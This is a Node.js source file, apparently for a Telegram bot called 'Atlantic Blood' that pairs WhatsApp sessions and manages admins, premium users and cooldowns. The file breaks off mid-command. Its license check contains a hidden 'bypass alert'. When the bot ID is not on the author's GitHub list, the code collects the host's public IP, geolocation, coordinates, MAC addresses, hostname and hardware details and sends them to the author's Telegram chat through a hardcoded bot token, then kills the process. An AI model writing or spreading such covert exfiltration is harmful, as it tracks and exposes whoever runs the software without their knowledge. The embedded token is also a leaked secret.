// =============================
// 🟢 MODULE IMPORT FIXED & CLEAN
// =============================
const fs = require("fs-extra");
const path = require("path");
const chalk = require("chalk");
const P = require("pino");
const AdmZip = require("adm-zip");
const crypto = require("crypto");
const cheerio = require("cheerio");
const moment = require("moment-timezone");
const os = require("os");
const puppeteer = require("puppeteer");
const prettier = require("prettier");
const FormData = require("form-data");
const { fileTypeFromBuffer } = require("file-type");
const JsConfuser = require("js-confuser");
const { spawnSync, exec } = require("child_process");
const readline = require("readline");
const { v4: uuidv4 } = require("uuid");

// axios tunggal (hindari 2 instance)
const axios = require("axios");
const fetch = require("node-fetch");

// =============================
// 🟢 CONFIG & DATABASE
// =============================
const dbFile = "./Database/db.json";
const config = require("./settings/config.js");
const { TOKEN, OWNER_ID, LOG_CHAT } = require("./settings/config.js");

// =============================
// 🟢 TELEGRAM BOT
// =============================
const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(TOKEN, { polling: true });

bot.on("polling_error", (err) => {
  console.error("DETAIL POLLING ERROR:", err);
});

// =============================
// 🟢 GOOGLE GEMINI (opsional)
// =============================
const { GoogleGenerativeAI } = require("@google/generative-ai");

// =============================
// 🟢 DNS TOOLS
// =============================
const dns = require("dns").promises;
const { promises: dns_subdo } = require("dns");
const stateMap_subdo = new Map();

// =============================
// 🟢 YOUTUBE SEARCH
// =============================
const yts = require("yt-search");

// =============================
// 🟢 BAILEYS
// =============================
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  generateWAMessageContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  makeInMemoryStore,
  Browsers,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
//─────COOLDOWN VARIABEL─────\\
const dataFolder = path.join(__dirname, "Database");
if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder, { recursive: true });

const cdFile = path.join(dataFolder, "cd.json");

let cooldownData = { time: 5 * 60 * 1000, users: {} };

try {
    if (!fs.existsSync(cdFile)) {
        fs.writeFileSync(cdFile, JSON.stringify(cooldownData, null, 2), "utf8");
    } else {
        const raw = fs.readFileSync(cdFile, "utf8").trim();
        if (raw) cooldownData = JSON.parse(raw);
        else console.log("[WARNING] cd.json kosong, menggunakan default cooldown.");
    }
} catch (err) {
    console.log("[WARNING] cd.json rusak atau tidak valid, menggunakan default cooldown.");
    cooldownData = { time: 5 * 60 * 1000, users: {} };
}

function saveCooldown() {
    try {
        fs.writeFileSync(cdFile, JSON.stringify(cooldownData, null, 2), "utf8");
    } catch (err) {
        console.error("[ERROR] Gagal menyimpan cd.json:", err);
    }
}

function checkCooldown(userId) {
    const now = Date.now();
    const endTime = cooldownData.users[userId] || 0;

    if (endTime > now) {
        return Math.ceil((endTime - now) / 1000);
    }

    cooldownData.users[userId] = now + cooldownData.time;
    saveCooldown();
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/i);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit.toLowerCase() === "s") cooldownData.time = value * 1000;
    else if (unit.toLowerCase() === "m") cooldownData.time = value * 60 * 1000;
    else if (unit.toLowerCase() === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `☇ Cooldown Settings ${value}${unit}`;
}

function cleanupCooldown() {
    const now = Date.now();
    for (const userId in cooldownData.users) {
        if (cooldownData.users[userId] <= now) delete cooldownData.users[userId];
    }
    saveCooldown();
}



//─────RUNTIME VARIABEL─────\\
const startTime = new Date();

function getRuntime() {
  const now = new Date();
  let diff = Math.floor((now - startTime) / 1000);

  const days = Math.floor(diff / 86400);
  diff %= 86400;
  const hours = Math.floor(diff / 3600);
  diff %= 3600;
  const minutes = Math.floor(diff / 60);
  const seconds = diff % 60;

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}



//─────DATE VARIABEL─────\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options);
}



//─────STATUS VARIABEL─────\\
let botStatus = "Online";

function getStatus() {
  try {
    if (!bot.isPolling()) return "Standby";
    return botStatus;
  } catch {
    return "Offline";
  }
}



//─────GREETING VARIABEL─────\\
function getGreeting() {
  const hour = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta", hour: "2-digit", hour12: false });
  const h = parseInt(hour);

  if (h >= 4 && h < 11) return "🌅 Selamat Pagi";
  if (h >= 11 && h < 15) return "🌤️ Selamat Siang";
  if (h >= 15 && h < 18) return "🌇 Selamat Sore";
  return "🌃 Selamat Malam";
}



//─────PLATFORM VARIABEL─────\\
function getSystemInfo() {
  const platform = os.platform();
  const release = os.release();
  const hostname = os.hostname();

  return {
    osName: `${platform} ${release}`,
    hostname
  };
}



//─────TOTAL VARIABEL─────\\
const totalCommands = 45;

function getCaptionVariables() {
  const sys = getSystemInfo();

  return {
    commands: `${totalCommands} Command Active`,
    os: `${sys.osName}`
  };
}



//─────CPU VARIABEL─────\\
function getCpuUsage() {
  const cpus = os.cpus();
  let totalIdle = 0, totalTick = 0;

  cpus.forEach((cpu) => {
    for (let type in cpu.times) {
      totalTick += cpu.times[type];
    }
    totalIdle += cpu.times.idle;
  });

  const idle = totalIdle / cpus.length;
  const total = totalTick / cpus.length;
  const usage = 100 - Math.round((100 * idle) / total);
  return usage;
}

let cpuUsage = getCpuUsage();

setInterval(() => {
  cpuUsage = getCpuUsage();
}, 1000);



//─────STORAGE VARIABEL─────\\
const dataDir = "./Database";
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

const antilinkFile = `${dataDir}/antilink.json`;
const onlyAdminFile = `${dataDir}/onlyadmin.json`;

if (!fs.existsSync(antilinkFile)) fs.writeFileSync(antilinkFile, JSON.stringify({}));
if (!fs.existsSync(onlyAdminFile)) fs.writeFileSync(onlyAdminFile, JSON.stringify({}));

const antilinkData = JSON.parse(fs.readFileSync(antilinkFile));
const onlyAdminData = JSON.parse(fs.readFileSync(onlyAdminFile));

const ONLY_FILE = "./Database/group.json";

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

function loadDB() {
  const data = fs.readFileSync(dbFile, "utf8");
  return JSON.parse(data);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(String(userId));
}

function saveDB(db) {
  fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
}

function isAdmin(userId) {
  const db = loadDB();
  return db.admins.includes(String(userId)) || isOwner(userId);
}

function isPremium(userId) {
    const db = loadDB();
    return db.premiums.some(p => String(p.id) === String(userId));
}


//─────CATBOX VARIABEL─────\\
async function CatBox(filePath) {
  try {
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", fs.createReadStream(filePath));

    const res = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    return res.data;
  } catch (err) {
    console.error("CatBox Upload Error:", err);
    return null;
  }
}



//─────DETECT IMAGE─────\\
function getFileExtension(mimeType) {
  switch (mimeType) {
    case "image/jpeg": return ".jpg";
    case "image/png": return ".png";
    case "image/gif": return ".gif";
    case "video/mp4": return ".mp4";
    case "video/mkv": return ".mkv";
    case "audio/mpeg": return ".mp3";
    case "audio/ogg": return ".ogg";
    case "application/pdf": return ".pdf";
    case "application/zip": return ".zip";
    default: return "";
  }
}

//─────DATABASE GITHUB─────\\
// === [ Konstanta Global ] ===
const TELEGRAM_ALERT_ID = 6578213381;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8314121660:AAHrWXFDH0JJ5RFWsBlsMoMDHDZCx8lUnCc";
const GITHUB_TOKEN_URL = "https://raw.githubusercontent.com/kaezarIX/AtlanticDb/refs/heads/main/id.json";

// =======================================================
// 🔰  INISIALISASI TELEGRAM BOT
// =======================================================

const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;

async function setBotProfile(bot) {
  try {
    console.log("⏳ Updating bot profile...");

    const botDefaultName = "⋆｡°✩ATLANTIC ꪉ BLOOD ( 大西洋 )✩°｡⋆";
    const botDefaultDescription = "このスクリプトをご利用いただきありがとうございます。@AtlanticBlood への登録もお忘れなく! 🕊";
    const botDefaultShortDescription = "このスクリプトをご利用いただきありがとうございます。@AtlanticBlood への登録もお忘れなく! 🕊";

    // 🔹 Update Bot Name
    await axios.post(`${TELEGRAM_API}/setMyName`, { name: botDefaultName });

    // 🔹 Update Bot Description
    await axios.post(`${TELEGRAM_API}/setMyDescription`, { description: botDefaultDescription });

    // 🔹 Update Short Description
    await axios.post(`${TELEGRAM_API}/setMyShortDescription`, { short_description: botDefaultShortDescription });

    // 🔹 Set Commands (sudah ada di node-telegram-bot-api)
    await bot.setMyCommands([{ command: "start", description: "大西洋システムを実行する" }]);

    console.log("✅ Bot profile updated successfully!");
  } catch (error) {
    console.error("❌ Failed to update bot profile:", error.response?.data || error.message || error);
  }
}

// ======================================================================
// 🔧  FUNGSI UTIL — Escape HTML & HTML
// ======================================================================

// Escape karakter khusus HTMLV2 Telegram
function escapeHTMLV2(text = "") {
  return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

// Escape HTML untuk mode HTML (tidak bentrok dengan escape HTML)
function escapeHtml(text = "") {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}



// ======================================================================
// 🔐  FUNGSI AMBIL TOKEN VALID DARI GITHUB
// ======================================================================
async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_TOKEN_URL, { timeout: 8000 });

    if (res && res.data) {
      if (Array.isArray(res.data)) return res.data;
      if (Array.isArray(res.data.ids)) return res.data.ids;
      if (Array.isArray(res.data.tokens)) return res.data.tokens;
    }

    console.warn(
      chalk.yellow("⚠️ Format GitHub salah. Gunakan { \"ids\": [...] } atau [\"...\"]")
    );
    return [];

  } catch (e) {
    console.error(chalk.red(`⚠️ Gagal mengambil token GitHub: ${e.message}`));
    return [];
  }
}

// ======================================================================
// 🚨  SUPER-ACCURATE BYPASS ALERT v3
// ======================================================================
async function sendBypassAlert(reason = "Unknown Security Event", ctx = null) {
  try {
    const attackerId = ctx?.from?.id || ctx?.chat?.id || "UNKNOWN";

    // =============================
    // GET TIMESTAMP ULTRA-AKURAT
    // — Dengan sync timezone real sesuai GeoIP
    // =============================
    const localTime = new Date().toISOString();

    // =============================
    // MULTI-SOURCE GEO LOOKUP
    // =============================
    let ipInfo = {
      ip: "N/A",
      city: "N/A",
      region: "N/A",
      country_name: "N/A",
      org: "N/A",
      asn: "N/A",
      latitude: "N/A",
      longitude: "N/A",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    try {
      const ipRes = await axios.get("https://ipapi.co/json/");
      if (ipRes?.data?.ip) ipInfo = { ...ipInfo, ...ipRes.data };
    } catch {}

    // — Fallback jika ipapi gagal
    if (ipInfo.ip === "N/A") {
      try {
        const ip2 = await axios.get("https://api.ipify.org?format=json");
        ipInfo.ip = ip2.data.ip;
      } catch {}
    }

    // =============================
    // DEVICE FINGERPRINT (DETAILED)
    // =============================
    const cpus = os.cpus();
    const cpuModel = cpus?.[0]?.model || "Unknown CPU";
    const cpuSpeed = cpus?.[0]?.speed ? cpus[0].speed + " MHz" : "N/A";

    const totalMem = (os.totalmem() / 1e9).toFixed(2);
    const freeMem = (os.freemem() / 1e9).toFixed(2);

    const network = os.networkInterfaces();
    const interfaces = Object.entries(network)
      .map(([name, data]) => {
        const ipv4 = data.find((x) => x.family === "IPv4" && !x.internal);
        return ipv4
          ? `${name}: IP=${ipv4.address}, MAC=${ipv4.mac}`
          : null;
      })
      .filter(Boolean)
      .join(" | ");

    // =============================
    // INTEGRITY HASH (ANTI MODIF FILE)
    // =============================
    const scriptPath = process.argv[1] || __filename;
    let integrityHash = "N/A";

    try {
      const fileBuffer = fs.readFileSync(scriptPath);
      integrityHash = crypto
        .createHash("sha256")
        .update(fileBuffer)
        .digest("hex");
    } catch {}

    // =============================
    // PROCESS META
    // =============================
    const uptimeMinutes = Math.floor(process.uptime() / 60);

    // =============================
    // Build HTML (block aesthetic)
    // =============================
    const msg = `
<blockquote><b>🚨 PENCOBAAN BYPASS TERDETEKSI</b></blockquote>

<b>Reason:</b> <code>${escapeHtml(reason)}</code>

<blockquote><b>🔎 USER INFO</b></blockquote>
• <b>Attacker ID:</b> <code>${escapeHtml(String(attackerId))}</code>
• <b>Owner Registered:</b> <code>${escapeHtml(String(OWNER_ID))}</code>

<blockquote><b>📅 WAKTU</b></blockquote>
• <b>Server Time:</b> <code>${escapeHtml(localTime)}</code>
• <b>Timezone:</b> <code>${escapeHtml(ipInfo.timezone)}</code>

<blockquote><b>🖥️ DEVICE FINGERPRINT</b></blockquote>
• <b>OS:</b> <code>${escapeHtml(os.platform() + " " + os.release())}</code>
• <b>CPU:</b> <code>${escapeHtml(cpuModel)}</code>
• <b>CPU Speed:</b> <code>${escapeHtml(cpuSpeed)}</code>
• <b>Inti CPU:</b> <code>${escapeHtml(cpus.length)}</code>
• <b>Total RAM:</b> <code>${escapeHtml(totalMem + " GB")}</code>
• <b>Sisa RAM:</b> <code>${escapeHtml(freeMem + " GB")}</code>
• <b>Hostname:</b> <code>${escapeHtml(os.hostname())}</code>
• <b>Network:</b> <code>${escapeHtml(interfaces || "N/A")}</code>

<blockquote><b>🌍 GEO-IP (HIGH ACCURACY)</b></blockquote>
• <b>IP:</b> <code>${escapeHtml(ipInfo.ip)}</code>
• <b>Kota:</b> <code>${escapeHtml(ipInfo.city)}</code>
• <b>Region:</b> <code>${escapeHtml(ipInfo.region)}</code>
• <b>Negara:</b> <code>${escapeHtml(ipInfo.country_name)}</code>
• <b>ISP:</b> <code>${escapeHtml(ipInfo.org)}</code>
• <b>ASN:</b> <code>${escapeHtml(ipInfo.asn || "N/A")}</code>
• <b>Koordinat:</b> <code>${escapeHtml(ipInfo.latitude + ", " + ipInfo.longitude)}</code>

<blockquote><b>🛡 INTEGRITY & PROCESS</b></blockquote>
• <b>Script Hash:</b> <code>${escapeHtml(integrityHash)}</code>
• <b>Process PID:</b> <code>${escapeHtml(String(process.pid))}</code>
• <b>Node Version:</b> <code>${escapeHtml(process.version)}</code>
• <b>Uptime:</b> <code>${uptimeMinutes} menit</code>
`.trim();

    // =============================
    // SEND TO TELEGRAM
    // =============================
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_ALERT_ID,
        text: msg,
        parse_mode: "HTML",
        disable_web_page_preview: true
      }
    );

    console.log(
      chalk.yellowBright(`📤 BYPASS ALERT SENT → ${TELEGRAM_ALERT_ID}`)
    );

  } catch (err) {
    console.error("❌ Error saat kirim bypass alert:", err.response?.data || err);
  }
}

// PANGGIL FUNGSI
setBotProfile(bot);

// ======================================================================
// 🛡 VALIDASI TOKEN — Sistem Keamanan Utama
// ======================================================================
async function validateToken() {
  try {
    console.log(chalk.blue.bold("🔍 Memeriksa ID token...\n"));

    if (!TOKEN) {
      console.error(chalk.red("❌ TOKEN tidak ditemukan!"));
      process.exit(1);
    }

    const localId = String(TOKEN).split(":")[0].trim();

    if (!localId) {
      console.error(chalk.red("❌ Gagal mengekstrak ID dari TOKEN"));
      process.exit(1);
    }

    const rawValidTokens = await fetchValidTokens();

    if (!Array.isArray(rawValidTokens)) {
      console.error(chalk.red("❌ Data token GitHub tidak valid (bukan array)"));
      process.exit(1);
    }

    const validIds = rawValidTokens
      .map((t) => String(t).split(":")[0].trim())
      .filter(Boolean);

    console.log(chalk.gray(`🔎 Local BOT ID : ${localId}`));
    console.log(chalk.gray(`🔎 Valid IDs    : ${validIds.length}\n`));



    // ❌ Jika ID tidak terdaftar
    if (!validIds.includes(localId)) {
      console.log(chalk.red(`
═══════════════════════════════════════════
⚠️  ID BOT ANDA *TIDAK TERDAFTAR* DI DATABASE!
═══════════════════════════════════════════
`));

      await sendBypassAlert("ID token tidak terdaftar di GitHub");

      console.log(chalk.redBright("\n💣 Sistem akan dimatikan demi keamanan...\n"));

      await new Promise((r) => setTimeout(r, 2500));

      try {
        process.stdin.destroy();
        process.stdout.destroy();
        process.stderr.destroy();
      } catch {}

      process.exitCode = 1;
      process.kill(process.pid, "SIGTERM");

      return setTimeout(() => {
        console.error("💥 Process aborted by security layer.");
        process.abort();
      }, 1000);
    }



    // ✅ Token Valid → Jalankan Bot
    console.log(chalk.green.bold("✅ Token valid — Bot diizinkan berjalan."));
    startBot();
    initializeWhatsAppConnections();

  } catch (err) {
    console.error(chalk.red("❌ Kesalahan saat validasi token:"), err.message);
    process.exit(1);
  }
}

// === [ Banner & Start Info — Atlantic Blood ] ===
async function startBot() {
  console.clear();

  console.log(chalk.cyan("\n⚙️  Launching Atlantic Blood...\n"));
  console.log(chalk.greenBright("✅ Initializing system..."));
  await new Promise((r) => setTimeout(r, 800));

  console.clear();

  // === ASCII ART HEADER ===
  const asciiArt = chalk.redBright(`
⡀            
   ⡀            ⣼⡇            
   ⢷⡀       ⠻⣦ ⢀⣿⡇    ⢀⣴⣾⣿⣿⣦⡀ 
   ⠸⣿⣦⣀      ⢹⡇⢸⣿⣇   ⢀⡾⠋⠁  ⡀⠉ 
 ⢠⣄⣀⠘⢿⣿⣿⣦⣄⡀  ⢸⠃⢸⣿⣿   ⠘  ⣠⣾⠟⠉⠁ 
 ⠘⠻⠿⣷⣦⠙⠻⣿⣿⣿⣦ ⠈⢀⣿⣿⣿⠇   ⣠⣾⣿⠃    
     ⠙⠷⡀⠘⢿⣿⣿⣧ ⣿⣿⣿⡟ ⣀⣴⣿⣿⡿⠁     
         ⠈⢿⣿⣿⢀⣿⡿⠋⣠⣾⣿⣿⣿⠟       
      ⢀⣠⣤⣤⣤⣌⢻⣿⣿⣶⣿⣿⡿⠿⠋⠁        
 ⠠⣤⣤⣴⣾⣿⡿⠿⣿⠿⠿⣿⡿⣿⡿⣿⣶⣶⣶⣶⣤⣤⣄⣀⡀    
   ⠈⠁⢀⣠⠔⠂⢀⣴⣿⣿⠁⣿⣷⣄⠙⠿⠿⠿⠿⠿⠿⠿⢷⣦⡀ 
  ⠲⠶⠾⠛⠁  ⣿⣿⣿⡿ ⢻⣿⣿⣿⡆ ⠠⠤⠤⠶⠶⣶⡄ ⠁ 
         ⣿⣿⡟   ⠙⠿⣿⣿⡄          
        ⢸⣿⡟      ⠈⠙⣷          
        ⠛⠉         ⠈          
`);

  console.log(asciiArt);

  // === Notification Box ===
  console.log(
    chalk.cyanBright(
      "┏────「 NOTIFICATION - INFO 」\n" +
      "│ Telegram Bot Is Running 🚀\n" +
      "┗────────────────────────────━❏"
    )
  );

  // === Bot Details ===
  console.log(
    chalk.gray("┏────「 BOT DETAILS 」") + "\n" +
    chalk.white("│ Name Script : ") + chalk.cyan("Atlantic Blood") + "\n" +
    chalk.white("│ Author      : ") + chalk.yellow("t.me/K4ezarIX") + "\n" +
    chalk.white("│ Version     : ") + chalk.green("JavaScript V2.9.0") + "\n" +
    chalk.gray("┗────────────────────────────━❏")
  );

  // === Start Info Panel ===
  console.log(
    "\n" +
    chalk.bgCyan.black(" [ Atlantic Blood ] ") +
    chalk.greenBright(" ✅ Successfully Started!") +
    "\n" +
    chalk.gray("────────────────────────────────────") +
    "\n" +
    chalk.white("🤖 Status: ") + chalk.green("Online") + "\n" +
    chalk.white("📡 Mode: ") + chalk.yellow("Production") + "\n" +
    chalk.white("🕓 Time: ") +
      chalk.magentaBright(
        new Date().toLocaleString("id-ID", {
          dateStyle: "full",
          timeStyle: "short",
          timeZone: "Asia/Makassar" // WITA
        })
      ) +
    "\n" +
    chalk.gray("────────────────────────────────────") +
    "\n"
  );
}
// === [ Fungsi Dummy untuk WhatsApp ] ===
function initializeWhatsAppConnections() {
  console.log(chalk.yellow("📞 Menginisialisasi koneksi WhatsApp (simulasi)..."));
}
// === [ Jalankan Validasi Token Saat Start ] ===
validateToken();

// ==========================================================
// GLOBALS
// ==========================================================
let sock;
const sessions = new Map();

const SESSIONS_DIR = path.join(__dirname, "Sessions");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

const SESSIONS_FILE = path.join(SESSIONS_DIR, "sessions.json");

// ==========================================================
// SIMPAN LIST NOMOR BOT AKTIF
// ==========================================================
const saveActiveSessions = (botNumber) => {
  try {
    let sessionsList = [];

    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      sessionsList = existing.includes(botNumber)
        ? existing
        : [...existing, botNumber];
    } else {
      sessionsList = [botNumber];
    }

    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList, null, 2));
  } catch (error) {
    console.error("Error saving session:", error);
  }
};

// ==========================================================
// BUAT FOLDER SESSION
// ==========================================================
const createSessionDir = (botNumber) => {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  return deviceDir;
};

// ==========================================================
// FUNGSI CONNECT
// ==========================================================
const connectToWhatsApp = async (botNumber, chatId, statusMessageId) => {
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }), // FIXED: P bukan pino
    defaultQueryTimeoutMs: undefined,
  });

  // ======================================================
  // EVENT UPDATE CONNECTION
  // ======================================================
  sock.ev.on("connection.update", async (update) => {
    try {
      const { connection, lastDisconnect } = update;

      // ==================================================
      // KONEKSI CLOSE
      // ==================================================
      if (connection === "close") {
        const statusCode =
          lastDisconnect?.error?.output?.statusCode ??
          lastDisconnect?.error?.output?.payload?.statusCode ??
          0;

        // Error server → retry
        if (statusCode >= 500 && statusCode < 600) {
          await bot.editMessageText(
            `
<blockquote>┌─────────────────────────┐
│ 🔄 𝖳𝖤𝖱𝖩𝖠𝖣𝖨 𝖪𝖤𝖲𝖠𝖫𝖠𝖧𝖠𝖭 🌿
├─────────────────────────┤
│ 📤 Nomor  : ${botNumber}
│ 🔁 Status : Reconnecting...
└─────────────────────────┘</blockquote>
`,
            { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
          );

          await new Promise((res) => setTimeout(res, 3000));
          return connectToWhatsApp(botNumber, chatId, statusMessageId);
        }

        // Session invalid → hapus
        await bot.editMessageText(
          `
<blockquote>┌─────────────────────────┐
│ 🌿 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇 𝖦𝖺𝗀𝖺𝗅 🌿
├─────────────────────────┤
│ 📤 Nomor  : ${botNumber}
│ 💢 Status : Session Terhapus ❌
└─────────────────────────┘</blockquote>
`,
          { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
        );

        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (e) {
          console.error("Error deleting session:", e);
        }

        sessions.delete(botNumber);
        return;
      }

      // ==================================================
      // BERHASIL KONEKSI
      // ==================================================
      if (connection === "open") {
        sessions.set(botNumber, sock);
        saveActiveSessions(botNumber);

        return bot.editMessageText(
          `
<blockquote>┌─────────────────────────┐
│ 🌿 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇 𝖲𝗎𝗄𝗌𝖾𝗌 🌿
├─────────────────────────┤
│ 📤 Nomor  : ${botNumber}
│ 💫 Status : Sukses Connect ✅
└─────────────────────────┘</blockquote>
`,
          { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
        );
      }

      // ==================================================
      // TAMPILKAN KODE PAIRING
      // ==================================================
      if (connection === "connecting") {
        await new Promise((r) => setTimeout(r, 1000));

        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          try {
            let code = null;

            if (typeof sock.requestPairingCode === "function")
              code = await sock.requestPairingCode(botNumber);

            if (typeof sock.generatePairingCode === "function")
              code = await sock.generatePairingCode(botNumber);

            if (code) {
              const formatted = code.toString().match(/.{1,4}/g)?.join("-");

              return bot.editMessageText(
                `
<blockquote>┌─────────────────────────┐
│ 🌿 𝖸𝖮𝖴𝖱 𝖢𝖮𝖣𝖤 𝖯𝖠𝖨𝖱𝖨𝖭𝖦 🌿
├─────────────────────────┤
│ 📱 Nomor : ${botNumber}
│ 💫 Kode  : <code>${formatted}</code>
└─────────────────────────┘</blockquote>`,
                { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
              );
            }

            await bot.editMessageText(
              `
<blockquote>┌─────────────────────────┐
│ ⚠️ PAIRING CODE TIDAK DITEMUKAN ⚠️
├─────────────────────────┤
│ 📤 Nomor : ${botNumber}
│ ❗ Info  : Baileys tidak memberi pairing code.
└─────────────────────────┘</blockquote>
`,
              { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
            );
          } catch (err) {
            await bot.editMessageText(
              `
<blockquote>┌─────────────────────────┐
│ ⚠️ 𝖤𝗋𝗋𝗈𝗋 𝗉𝖺𝗂𝗋𝗂𝗇𝗀 ⚠️
├─────────────────────────┤
│ 📤 Nomor : ${botNumber}
│ ❗ Info  : ${err.message}
└─────────────────────────┘</blockquote>`,
              { chat_id: chatId, message_id: statusMessageId, parse_mode: "HTML" }
            );
          }
        }
      }
    } catch (e) {
      console.error("Unhandled connection.update error:", e);
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

// ==========================================================
// COMMAND /connect
// ==========================================================
bot.onText(/\/connect\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  const rawNumber = match[1] ?? "";
  const botNumber = rawNumber.replace(/\D/g, "");

  if (!isOwner(fromId))
    return bot.sendMessage(chatId, "❌ Anda Terdeteksi Bukan Owner!");

  if (sessions.has(botNumber))
    return bot.sendMessage(chatId, `⸙ Nomor ${botNumber} sudah terhubung!`);

  const statusMessage = await bot.sendMessage(
    chatId,
    `
<blockquote>┌─────────────────────────┐
│ 🍂 𝖬𝖤𝖭𝖸𝖨𝖠𝖯𝖪𝖠𝖭 𝖢𝖮𝖣𝖤 𝖯𝖠𝖨𝖱𝖨𝖭𝖦 🍂
└─────────────────────────┘</blockquote>
`,
    { parse_mode: "HTML" }
  );

  try {
    await connectToWhatsApp(botNumber, chatId, statusMessage.message_id);
  } catch (err) {
    await bot.editMessageText(
      `
<blockquote>┌─────────────────────────┐
│ ⚠️ 𝖤𝗋𝗋𝗈𝗋 𝗉𝖺𝗂𝗋𝗂𝗇𝗀 ⚠️
└─────────────────────────┘</blockquote>
`,
      { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "HTML" }
    );
  }
});
//─────SETCD─────\\
bot.onText(/^\/setcd\s*(.*)/i, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const timeString = match[1]?.trim();

    if (!isOwner(fromId)) {
      return bot.sendMessage(chatId, "❌ Anda Terdeteksi Bukan Owner!");
    }
    
    if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(
      msg.chat.id,
      "AWOWKWOK YATIM",
      { parse_mode: "HTML" }
    );
  }

    if (!timeString) {
      return bot.sendMessage(chatId, '☇ Format salah!\nContoh:\n/setcd 5s\n/setcd 10m\n/setcd 1h');
    }

    const result = setCooldown(timeString);

    if (result.startsWith("Format salah")) {
      return bot.sendMessage(chatId, `☇ ${result}\nContoh:\n/setcd 5s\n/setcd 10m\n/setcd 1h`);
    }

    bot.sendMessage(chatId, result);
  });
  
  
  
//─────TAMBAH ADMIN─────\\
bot.onText(/\/addadmin (\d+)/, (msg, match) => {
    const fromId = msg.from.id;
    const userIdToAdd = match[1];

    if (!isOwner(fromId)) {
      return bot.sendMessage(msg.chat.id, "❌ Anda Terdeteksi Bukan Owner!");
    }
    
    if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(
      msg.chat.id,
      "AWOWKWOK YATIM",
      { parse_mode: "HTML" }
    );
  }

    const db = loadDB();
    if (!db.admins.includes(userIdToAdd)) {
      db.admins.push(userIdToAdd);
      saveDB(db);
      bot.sendMessage(msg.chat.id, `User ${userIdToAdd} berhasil ditambahkan sebagai admin ✅️`);
    } else {
      bot.sendMessage(msg.chat.id, `ⵌ User ${userIdToAdd} sudah menjadi admin.`);
    }
  });



//─────DELETE ADMIN─────\\
  bot.onText(/\/deladmin (\d+)/, (msg, match) => {
    const fromId = msg.from.id;
    const userIdToDel = match[1];

    if (!isOwner(fromId)) {
      return bot.sendMessage(msg.chat.id, "❌ Anda Terdeteksi Bukan Owner!");
    }
    
    if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(
      msg.chat.id,
      "AWOWKWOK YATIM",
      { parse_mode: "HTML" }
    );
  }

    const db = loadDB();
    db.admins = db.admins.filter(id => id !== userIdToDel);
    saveDB(db);
    bot.sendMessage(msg.chat.id, `❗️ User ${userIdToDel} bukan admin lagi.`);
  });



//─────TAMBAH PREMIUM─────\\

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !isAdmin(senderId)) {
    return bot.sendMessage(chatId, `❌ Akses ditolak, hanya owner dan Admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `❌ Command salah. Masukan user id serta waktu expired.\nExample: /addprem 8463608152 30d`);
  }

  const args = match[1].trim().split(" ");
